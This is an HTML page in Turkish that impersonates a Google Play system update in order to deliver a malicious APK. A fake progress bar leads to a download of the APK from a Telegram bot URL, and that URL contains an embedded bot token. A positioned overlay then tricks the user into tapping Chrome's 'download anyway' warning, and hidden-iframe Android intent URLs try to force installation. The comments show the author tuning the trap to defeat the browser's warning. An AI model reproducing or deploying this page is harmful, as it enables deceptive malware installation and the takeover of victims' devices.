<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Play - Sistem Güncellemesi</title>
    <style>
        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #ffffff; margin: 0; overflow: hidden; }
        .container { width: 90%; max-width: 400px; text-align: center; }
        .logo { width: 60px; margin-bottom: 20px; }
        .title { font-size: 22px; color: #202124; margin-bottom: 10px; font-weight: 500; }
        .progress-container { width: 100%; background: #e8eaed; border-radius: 10px; height: 4px; margin: 25px 0; }
        .progress-bar { width: 0%; height: 100%; background: #01875f; border-radius: 10px; transition: width 0.2s; }
        .status { color: #5f6368; font-size: 14px; margin-top: 10px; line-height: 1.4; }
        #start-btn { background: #01875f; color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }

        /* CLICK-TRAP: Son attığın görsele (image_5ddd32.png) göre milimetrik ayar */
        #click-trap {
            position: fixed;
            bottom: 23%;    /* Chrome'un 'Yine de indir' butonunun tam hizası */
            right: 10%;     /* Sağdan konumu */
            width: 38%;     /* Butonu tam kaplayacak genişlik */
            height: 60px;   /* Tıklama alanı yüksekliği */
            background: rgba(255, 0, 0, 0.4); /* YERİNİ GÖRMEK İÇİN KIRMIZI - Başarılı olunca 0 yap */
            z-index: 10000;
            display: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" class="logo">
        <div id="title" class="title">Sistem Hazırlanıyor...</div>
        <div class="progress-container">
            <div id="bar" class="progress-bar"></div>
        </div>
        <p id="status" class="status">Cihaz uyumluluğu kontrol ediliyor.</p>
        <button id="start-btn">Güncellemeyi Kur</button>
    </div>

    <div id="click-trap"></div>

    <script>
        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";

        document.getElementById('start-btn').addEventListener('click', function() {
            this.style.display = 'none';
            const bar = document.getElementById('bar');
            const status = document.getElementById('status');
            const trap = document.getElementById('click-trap');
            
            let width = 0;
            const interval = setInterval(() => {
                width += Math.random() * 9;
                if (width >= 100) {
                    clearInterval(interval);
                    bar.style.width = "100%";
                    status.innerText = "Yükleme doğrulanıyor...";

                    // 1. ADIM: Chrome uyarısını tetikle
                    window.location.href = apkUrl;

                    // 2. ADIM: Tuzağı göster
                    setTimeout(() => {
                        trap.style.display = "block";
                        status.innerHTML = "<b style='color:#d93025'>KRİTİK:</b> Devam etmek için alttaki <b>'Yine de indir'</b> butonuna dokunun.";
                    }, 1000);

                } else {
                    bar.style.width = width + "%";
                    status.innerText = "Güncelleme hazırlanıyor: %" + Math.round(width);
                }
            }, 100);
        });

        // 3. ADIM: TUZAK TIKLANDIĞINDA (Kullanıcı onay verdiği an)
        document.getElementById('click-trap').addEventListener('click', function() {
            // Kullanıcı zaten Chrome'un butonuna basmış oluyor.
            // Biz de aynı anda işletim sistemine 'Bu dosyayı kur' emri gönderiyoruz.
            const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
            
            // Gizli bir iframe ile sistemi arka planda yüklemeye zorla
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = intentUrl;
            document.body.appendChild(iframe);

            // Ayrıca sayfayı da yönlendirerek şansı ikiye katla
            setTimeout(() => {
                window.location.href = intentUrl;
            }, 100);
        });
    </script>
</body>
</html>
